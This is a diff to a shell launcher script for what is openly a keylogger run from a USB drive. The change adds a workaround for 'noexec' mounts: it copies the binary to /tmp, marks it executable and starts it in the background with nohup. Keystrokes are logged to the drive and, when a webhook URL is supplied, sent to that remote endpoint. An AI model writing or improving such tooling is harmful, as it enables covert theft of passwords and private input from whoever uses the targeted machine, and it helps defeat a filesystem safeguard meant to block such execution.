@@ -89,30 +89,48 @@ mkdir -p "$SCRIPT_DIR/logs"
 
 # Run the keylogger with optional webhook URL
 # Log file will be created in the USB drive's logs directory
-# On FAT32/exFAT, we need to explicitly invoke bash/sh to run the binary
-if [ -n "$WEBHOOK_URL" ]; then
-    # Try to run the binary directly, fall back to explicit invocation if needed
-    if [ -x "$BINARY_PATH" ]; then
-        nohup "$BINARY_PATH" "$WEBHOOK_URL" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
-    else
-        # FAT32/exFAT may not support execute bit, but binary should still work
-        nohup sh -c "exec '$BINARY_PATH' '$WEBHOOK_URL'" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
+# Note: USB drives mounted in /run/media often have 'noexec' option which prevents direct execution
+# To work around this, we copy the binary to /tmp first if we detect we're on a noexec filesystem
+
+# Function to check if we're on a noexec filesystem
+is_noexec_mount() {
+    local file_path="$1"
+    local mount_point=$(df "$file_path" | tail -1 | awk '{print $6}')
+    if mount | grep " $mount_point " | grep -q noexec; then
+        return 0  # true, is noexec
     fi
+    return 1  # false, not noexec
+}
+
+# Check if we need to copy the binary to /tmp
+EXEC_PATH="$BINARY_PATH"
+if is_noexec_mount "$BINARY_PATH"; then
+    echo "⚠️  USB drive mounted with 'noexec' option detected"
+    echo "   Copying binary to /tmp to enable execution..."
+    EXEC_PATH="/tmp/rust-key-$$"
+    cp "$BINARY_PATH" "$EXEC_PATH"
+    chmod +x "$EXEC_PATH"
+    echo "✅ Binary copied to $EXEC_PATH"
+    echo ""
+fi
+
+# Run the keylogger
+if [ -n "$WEBHOOK_URL" ]; then
+    # Run in background with nohup, redirect output to USB drive
+    nohup "$EXEC_PATH" "$WEBHOOK_URL" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
     KEYLOGGER_PID=$!
 else
-    # Try to run the binary directly, fall back to explicit invocation if needed
-    if [ -x "$BINARY_PATH" ]; then
-        nohup "$BINARY_PATH" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
-    else
-        # FAT32/exFAT may not support execute bit, but binary should still work
-        nohup sh -c "exec '$BINARY_PATH'" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
-    fi
+    # Run in background with nohup, redirect output to USB drive
+    nohup "$EXEC_PATH" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
     KEYLOGGER_PID=$!
 fi
 
 echo "✅ Keylogger started with PID: $KEYLOGGER_PID"
 echo ""
 echo "📝 Keystrokes will be logged to: $SCRIPT_DIR/logs/keylog.txt"
+if [ "$EXEC_PATH" != "$BINARY_PATH" ]; then
+    echo "ℹ️  Binary is running from: $EXEC_PATH (copied from USB due to noexec mount)"
+fi
 if [ -n "$WEBHOOK_URL" ]; then
     echo "🌐 Keystrokes will be sent to: $WEBHOOK_URL"
 fi
